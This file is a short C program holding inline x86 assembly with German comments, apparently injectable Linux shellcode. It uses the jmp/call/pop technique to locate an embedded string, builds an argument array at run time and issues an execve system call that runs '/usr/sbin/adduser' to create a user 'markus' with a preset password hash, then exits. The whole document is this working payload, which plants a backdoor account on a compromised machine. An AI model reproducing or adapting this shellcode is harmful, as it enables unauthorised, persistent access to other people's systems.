void main() {
__asm__("
	jmp data
start:
	popl %esi				
	movl %esi,63(%esi)			#Adresse von name[0] nach [A]		
	leal 18(%esi),%eax			#Adresse von name[1] nach [A+1] (Muss durch 2 Befehle realisiert werden)
	movl %eax,67(%esi)			
	leal 25(%esi),%eax			#Adresse von name[2] nach [A+2]
	movl %eax,71(%esi)		
	leal 28(%esi),%eax			#Adresse von name[3] nach [A+3]
	movl %eax,75(%esi)
	xorl %eax,%eax			#eax auf NULL setzen		
	movb %al,17(%esi)			#Endekennungen der Strings
	movb %al,24(%esi)
	movb %al,27(%esi)
	movb %al,62(%esi)
	movl %eax,79(%esi)			#vorher 0x7D?#NULL-Pointer der Pointer-Liste
	movb $0xb,%al				#Code der SysCall-Tabelle
	movl %esi,%ebx			#Adresse von name[0]
	leal 63(%esi),%ecx			#Adresse [A] nach ECX (name[])
	leal 79(%esi),%edx			#vorher 0x7D??#Adresse des Nullpointers nach EDX

	int $0x80

	#movl $0x1,%eax
	#movl $0x0,%ebx			#durch folgende Zeile ersetzt:
	xorl %ebx,%ebx
	movl %ebx,%eax
	inc %eax
	int $0x80	
data:
	call start
	.string \"/usr/sbin/adduser#markus#-p#$1$7ÏvÙLKÏµ$gSUKG6RALzRA8ryROcTsG0#\"
	");
}
